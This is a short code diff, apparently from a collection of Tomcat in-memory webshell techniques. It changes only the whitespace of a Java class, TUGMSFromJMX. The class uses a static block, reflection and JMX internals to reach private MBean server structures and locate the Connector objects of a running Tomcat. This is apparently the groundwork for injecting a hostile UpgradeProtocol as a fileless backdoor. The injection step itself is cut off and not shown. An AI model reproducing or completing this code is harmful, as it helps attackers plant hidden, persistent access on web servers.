@@ -26,7 +26,7 @@ public class TUGMSFromJMX implements UpgradeProtocol {
     static {
         try {
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
-            Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
+            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
             field.setAccessible(true);
             Object obj = field.get(mbeanServer);
 
@@ -37,13 +37,13 @@ public class TUGMSFromJMX implements UpgradeProtocol {
             Field field1 = repository.getClass().getDeclaredField("domainTb");
             field1.setAccessible(true);
 
-            HashMap map         = (HashMap) field1.get(repository);
+            HashMap map = (HashMap) field1.get(repository);
             HashMap catalinaMap = (HashMap) map.get("Catalina");
 
             for (int i = 0; i < catalinaMap.keySet().size(); i++) {
                 Object key = catalinaMap.keySet().toArray()[i];
                 if (key.toString().contains("type=Connector")) {
-                    NamedObject  namedObject  = (NamedObject) catalinaMap.get(key);
+                    NamedObject namedObject = (NamedObject) catalinaMap.get(key);
                     DynamicMBean dynamicMBean = namedObject.getObject();
 
                     Field field2 = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
